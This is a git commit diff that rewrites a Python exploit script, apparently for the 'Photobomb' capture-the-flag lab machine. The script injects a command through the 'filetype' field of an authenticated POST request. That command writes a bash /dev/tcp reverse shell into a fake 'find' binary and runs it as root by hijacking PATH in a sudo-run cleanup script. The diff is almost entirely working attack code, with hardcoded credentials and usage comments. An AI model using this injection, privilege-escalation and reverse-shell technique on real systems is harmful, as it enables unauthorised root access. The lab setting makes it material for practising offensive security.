878ac96ee512d005428ec56ed0d3df369a0d0a32
akhils911dev <dev.akhils911@gmail.com>
2022-10-22 18:34:30 +0530

    Rebuild the full pwn script

--- photobomb/photobomb-pwn.py
+++ photobomb/photobomb-pwn.py
@@ -1,18 +1,29 @@
+# This is a script i used to get a reverse shell from target as root user
+# Usage: Python3 photobombo-pwn.py localIP localPORT
+# Setup: Run a netcat listener on localport 
+# WARNING: Before run the script make sure your host file containe the target hostname
+
 import sys
-import requests
+import requests	
 
-# Making of reverse-shell
-def rce(ip,port):
-	reverse_shell = "bash -i >& /dev/tcp/"+ ip + "/"+ port + " 0>&1"
-	command = "/home/wizard/find | chmod +x /home/wizard/find | sudo PATH=/home/wizard:$PATH /opt/cleanup.sh"
-	payload = "echo -n \'"+ reverse_shell + "\' > " + command
-	return payload
+class Rce:
 
-pwn = rce(sys.argv[1],sys.argv[2])
+	def __init__(self,ip,port):
+		self.local_ip = ip
+		self.local_port = port
+		self.url = "http://photobomb.htb/printer"
+		self.header = {"Authorization": "Basic cEgwdDA6YjBNYiE="}
 
-# Request for inject the command
-url = "http://photobomb.htb/printer"
-header = {"Authorization": "Basic cEgwdDA6YjBNYiE="}
-data = {"photo":"finn-whelen-DTfhsDIWNSg-unsplash.jpg","filetype":"jpg;"+pwn,"dimensions":"3000x2000"}
-r = requests.post(url=url,headers=header,data=data)
-print(r.text)
+	def MakePayload(self):
+		ReverseShell = f"bash -i >& /dev/tcp/{self.local_ip}/{self.local_port} 0>&1"
+		Command = f"/home/wizard/find | chmod +x /home/wizard/find | sudo PATH=/home/wizard:$PATH /opt/cleanup.sh"
+		payload = f"echo -n \'{ReverseShell}\' > {Command}"
+		self.RunCommand(payload)
+
+	def RunCommand(self,payload):
+		data = {"photo":"finn-whelen-DTfhsDIWNSg-unsplash.jpg","filetype":"jpg;"+payload,"dimensions":"3000x2000"}
+		r = requests.post(url=self.url,headers=self.header,data=data)
+		print(r.text)
+
+Rootshell = Rce(sys.argv[1],sys.argv[2])
+Rootshell.MakePayload()
